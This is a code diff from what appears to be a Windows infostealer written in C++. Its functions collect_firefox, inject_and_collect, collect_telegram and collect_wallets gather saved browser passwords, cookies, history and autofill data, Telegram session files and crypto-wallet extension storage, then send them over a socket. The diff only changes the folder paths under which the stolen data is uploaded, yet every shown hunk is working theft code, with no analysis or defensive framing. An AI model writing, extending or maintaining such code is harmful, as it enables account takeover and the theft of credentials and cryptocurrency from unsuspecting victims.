@@ -484,8 +484,8 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
         if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
             try {
                 std::stringstream ss_pass; json j_pass = json::array(); for (auto& p : p_data.passwords) { ss_pass << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n"; j_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_name_sanit + "/passwords.txt", ss_pass.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_name_sanit + "/passwords.json", j_pass);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/passwords.txt", ss_pass.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/passwords.json", j_pass);
 
                 std::stringstream ss_cook; json j_cook = json::array(); for (auto& c : p_data.cookies) {
                     ss_cook << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
@@ -494,16 +494,16 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
                     long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = c.is_secure ? "true" : "false"; cj["HTTP only raw"] = c.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (c.host[0] == '.') ? "false" : "true"; j_cook.push_back(cj);
                 }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_name_sanit + "/cookies.txt", ss_cook.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_name_sanit + "/cookies.json", j_cook);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/cookies.txt", ss_cook.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/cookies.json", j_cook);
 
                 std::stringstream ss_hist; json j_hist = json::array(); for (auto& h : p_data.history) { ss_hist << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_name_sanit + "/history.txt", ss_hist.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_name_sanit + "/history.json", j_hist);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/history.txt", ss_hist.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/history.json", j_hist);
 
                 std::stringstream ss_auto; json j_auto = json::array(); for (auto& a : p_data.autofill) { ss_auto << "Name: " << a.name << " | Value: " << a.value << "\n"; j_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_name_sanit + "/autofill.txt", ss_auto.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_name_sanit + "/autofill.json", j_auto);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/autofill.txt", ss_auto.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/autofill.json", j_auto);
             } catch (...) {}
         }
     }
@@ -601,8 +601,8 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
         if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
             try {
                 std::stringstream ss_p; json j_p = json::array(); for (auto& i : p_data.passwords) { ss_p << "URL: " << i.url << "\nUser: " << i.username << "\nPass: " << i.password << "\n\n"; j_p.push_back({{"url", ensure_utf8(i.url)}, {"username", ensure_utf8(i.username)}, {"password", ensure_utf8(i.password)}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_san + "/passwords.txt", ss_p.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_san + "/passwords.json", j_p);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/passwords.txt", ss_p.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/passwords.json", j_p);
 
                 std::stringstream ss_c; json j_c = json::array(); for (auto& i : p_data.cookies) {
                     ss_c << "Host: " << i.host << " | Name: " << i.name << " | Value: " << i.value << "\n";
@@ -611,16 +611,16 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
                     long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = i.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = i.is_secure ? "true" : "false"; cj["HTTP only raw"] = i.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (i.host[0] == '.') ? "false" : "true"; j_c.push_back(cj);
                 }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_san + "/cookies.txt", ss_c.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_san + "/cookies.json", j_c);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/cookies.txt", ss_c.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/cookies.json", j_c);
 
                 std::stringstream ss_h; json j_h = json::array(); for (auto& h : p_data.history) { ss_h << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_h.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_san + "/history.txt", ss_h.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_san + "/history.json", j_h);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/history.txt", ss_h.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/history.json", j_h);
 
                 std::stringstream ss_a; json j_a = json::array(); for (auto& a : p_data.autofill) { ss_a << "Name: " << a.name << " | Value: " << a.value << "\n"; j_a.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); }
-                send_recovery_text(sock, b_name_utf8 + "/" + p_san + "/autofill.txt", ss_a.str());
-                send_recovery_json(sock, b_name_utf8 + "/" + p_san + "/autofill.json", j_a);
+                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/autofill.txt", ss_a.str());
+                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/autofill.json", j_a);
             } catch (...) {}
         }
     }
@@ -682,13 +682,13 @@ void collect_telegram(SOCKET sock) {
                     for (const auto& sub : fs::directory_iterator(entry.path(), ec)) {
                         if (sub.is_regular_file()) {
                             std::vector<unsigned char> data = read_file_to_vector(sub.path());
-                            if (!data.empty()) send_recovery_file(sock, "Telegram/tdata/" + fn + "/" + sub.path().filename().string(), data);
+                            if (!data.empty()) send_recovery_file(sock, "telegram/tdata/" + fn + "/" + sub.path().filename().string(), data);
                         }
                     }
                 }
                 else if (fn == "key_datas" || fn == "settingss" || fn == "maps" || fn == "config") {
                     std::vector<unsigned char> data = read_file_to_vector(entry.path());
-                    if (!data.empty()) send_recovery_file(sock, "Telegram/tdata/" + fn, data);
+                    if (!data.empty()) send_recovery_file(sock, "telegram/tdata/" + fn, data);
                 }
             }
             break;
@@ -782,12 +782,12 @@ void collect_wallets(SOCKET sock) {
                         if (!uuid.empty()) {
                             fs::path idb = storage_base / ("moz-extension+++" + uuid) / "idb";
                             if (fs::exists(idb)) {
-                                std::error_code ec; for (const auto& f : fs::directory_iterator(idb, ec)) { if (f.path().extension() == ".sqlite" || f.path().extension() == ".files") { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } }
+                                std::error_code ec; for (const auto& f : fs::directory_iterator(idb, ec)) { if (f.path().extension() == ".sqlite" || f.path().extension() == ".files") { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/browsers/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } }
                             }
                         }
                     }
                     fs::path les_ff = prof_path / "browser-extension-data" / wallet.extension_ids[1];
-                    if (fs::exists(les_ff)) { std::error_code ec; for (const auto& f : fs::directory_iterator(les_ff, ec)) { if (f.is_regular_file(ec)) { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } }
+                    if (fs::exists(les_ff)) { std::error_code ec; for (const auto& f : fs::directory_iterator(les_ff, ec)) { if (f.is_regular_file(ec)) { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/browsers/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } }
                 }
             }
         } else {
@@ -798,7 +798,7 @@ void collect_wallets(SOCKET sock) {
             for (const auto& prof_path : profile_dirs) {
                 std::string prof_name = prof_path.filename().string(); if (prof_name.empty() || prof_name == data.filename().string()) prof_name = "Default";
                 fs::path les = prof_path / "Local Extension Settings"; if (!fs::exists(les)) continue;
-                for (const auto& wallet : WALLETS) { if (wallet.extension_ids.empty() || wallet.extension_ids[0].empty()) continue; send_extension_storage(sock, les / wallet.extension_ids[0], "wallets/" + wallet.name + "/" + wstring_to_utf8(browser.name) + "/" + prof_name); }
+                for (const auto& wallet : WALLETS) { if (wallet.extension_ids.empty() || wallet.extension_ids[0].empty()) continue; send_extension_storage(sock, les / wallet.extension_ids[0], "wallets/" + wallet.name + "/browsers/" + wstring_to_utf8(browser.name) + "/" + prof_name); }
             }
         }
     }
